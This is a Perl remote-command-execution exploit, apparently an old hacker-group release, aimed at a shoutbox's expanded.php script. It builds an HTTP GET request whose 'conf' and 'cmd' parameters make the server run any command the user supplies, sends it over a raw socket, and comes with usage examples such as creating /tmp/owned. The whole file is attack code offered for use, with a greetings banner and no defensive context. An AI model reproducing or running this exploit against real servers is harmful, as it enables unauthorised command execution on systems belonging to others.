#-------------------------------------------------------------------------
#
# expanded.php remote command execution Xploit
#
# Coded By _6mO_HaCk
#
# The Hackology Team
#
# Usage = perl expanded.pl <target> <port> <command>
#
# exp   = perl expanded.pl 127.0.0.1 80 ls
#       = perl expanded.pl localhost 80 touch+/tmp/owned

use IO::Socket;
use strict;

system(clear);
print "------------------------------------------\n";
print "--- expanded.php remote cmd execution  ---\n";
print "---              Xploit                ---\n";
print "---                                    ---\n";
print "---         Coded By _6mO_HaCk         ---\n";
print "---                                    ---\n";
print "--- Greetz to : effbeeye, D|NOOO       ---\n";
print "---             Thom4sss, DeV|L0Ty     ---\n";
print "---             MajNouN, |BiG-LuV|     ---\n";
print "---                                    ---\n";
print "---         The Hackology Team         ---\n";
print "------------------------------------------\n";

if(!defined($ARGV[0] && $ARGV[1] && $ARGV[2]))
{
   &usage;
}
my $host     = $ARGV[0];
my $port     = $ARGV[1];
my $cmd      = $ARGV[2];

my $conf     ="/tmp/.xploit";
my $sbdir    ="/shoutbox"; # define this to ur shoutbox dir if different
my $target   ="expanded.php?conf=";
my $Xploit   = "GET ${sbdir}/${target}${conf}&cmd=$cmd HTTP/1.1\nHost: 
$host\nConnection: Close\n\n";

my $tcpval   = getprotobyname('tcp');
my $serverIP = inet_aton($host);
my $serverAddr = sockaddr_in($ARGV[1], $serverIP);
my $protocol_name = "tcp";

my $ia       = inet_aton($host) 	   || die ("[-] Unable to resolve 
$host");
my $pa       = sockaddr_in($port, $ia)     || die ("[-] Unkown error");
my $proto    = getprotobyname('tcp')       || die ("[-] Unable to get 
protocol");
socket(SOCK, PF_INET, SOCK_STREAM, $proto) || die ("[-] Unable to open 
socket");
connect(SOCK, $pa) 			   || die ("[-] Unable to connect 
to $host:$port");

print "[*] Executing $cmd on $host:$port ...\n";
sleep(2);

my $submit   = "$Xploit";   
send(SOCK,$submit,0);
close(SOCK);

sub usage {die("\n\n[*] Usage : perl $0 <TargetIP> <TargetPort> 
<CmdToRun>\n\n");}
print "\n";
print "\n[+] Command should be successfully executed\n";

#-------------------------------------------------------------------------
